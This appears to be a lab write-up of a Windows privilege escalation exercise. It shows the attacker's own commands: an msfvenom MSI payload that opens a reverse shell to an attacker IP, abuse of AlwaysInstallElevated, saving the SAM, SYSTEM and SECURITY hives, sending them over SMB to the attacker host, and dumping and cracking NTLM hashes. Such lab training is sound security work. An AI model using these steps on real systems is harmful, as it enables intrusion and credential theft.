### Find left behind cleartext credentials for the iamtheadministrator domain admin account.

```cmd
whoami /groups

whoami /priv
```
![](Screenshot%202026-08-26%20at%2013.45.14.png)

I just ran winPEAS and got a answer
```powershell
.\winPEASEx64.exe
```
![](Screenshot%202026-08-26%20at%2014.03.31.png)
### Escalate privileges to SYSTEM and submit the contents of the flag.txt file on the Administrator Desktop

```Powershell
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer  
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
![](Screenshot%202026-08-26%20at%2014.12.41.png)

Create payload
```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.235 LPORT=4444 -f msi -o shell.msi
```

Setup listener
```shell
nc -lvnp 4444
```

Install msi package
```powershell
msiexec /quiet /i C:\Users\htb-student\shell.msi
```
![](Screenshot%202026-08-26%20at%2014.16.19.png)![](Screenshot%202026-08-26%20at%2014.16.56.png)
### There is 1 disabled local admin user on this system with a weak password that may be used to access other systems in the network and is worth reporting to the client. After escalating privileges retrieve the NTLM hash for this user and crack it offline. Submit the cleartext password for this account.

```cmd
mkdir C:\temp
reg save HKLM\SAM C:\temp\sam.save
reg save HKLM\SYSTEM C:\temp\system.save
reg save HKLM\SECURITY C:\temp\security.save
```
![](Screenshot%202026-08-26%20at%2014.24.55.png)

Open smb server and transfer 3 files to Attacker host
```shell
sudo impacket-smbserver share ~/loot -smb2support
```
![](Screenshot%202026-08-26%20at%2014.27.44.png)
![](Screenshot%202026-08-26%20at%2014.31.03.png)

Use impacket-secretsdump to dump the hash
```shell
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```
![](Screenshot%202026-08-26%20at%2014.32.47.png)

Lastly, I need to decode the hash to get a final answer
```shell
sudo hashcat -m 1000 hash /usr/share/wordlists/rockyou.txt
```
![](Screenshot%202026-08-26%20at%2014.36.01.png)